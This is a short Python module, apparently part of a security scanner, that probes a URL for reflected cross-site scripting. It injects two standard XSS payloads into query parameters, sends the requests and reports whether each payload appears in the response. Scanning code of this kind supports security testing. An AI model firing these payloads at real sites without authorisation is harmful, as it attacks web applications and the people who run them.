# RM-MOD-003 - Reflected XSS probe
id = "RM-MOD-003"
name = "Reflected XSS Naive Probe"
description = "Send simple script payloads in parameters and check if they are reflected back."

def run(target, context):
    import requests
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>']
    parsed = urlparse(target)
    qs = dict(parse_qsl(parsed.query))
    param = context.get("param") if isinstance(context, dict) else None
    if not param:
        test_params = list(qs.keys()) if qs else ["q"]
        if not qs:
            qs["q"] = ""
    else:
        test_params = [param]
        if param not in qs:
            qs[param] = ""
    results=[]
    for p_name in test_params:
        for payload in payloads:
            tqs = qs.copy(); tqs[p_name]=payload
            new = urlunparse(parsed._replace(query=urlencode(tqs)))
            try:
                r = requests.get(new, timeout=8)
                body = (r.text or "")[:3000]
                reflected = payload in body
                results.append({"param":p_name,"payload":payload,"url":new,"status_code":r.status_code,"reflected":bool(reflected)})
            except Exception as e:
                results.append({"param":p_name,"payload":payload,"url":new,"error":str(e)})
    return {"target":target,"checks":results}
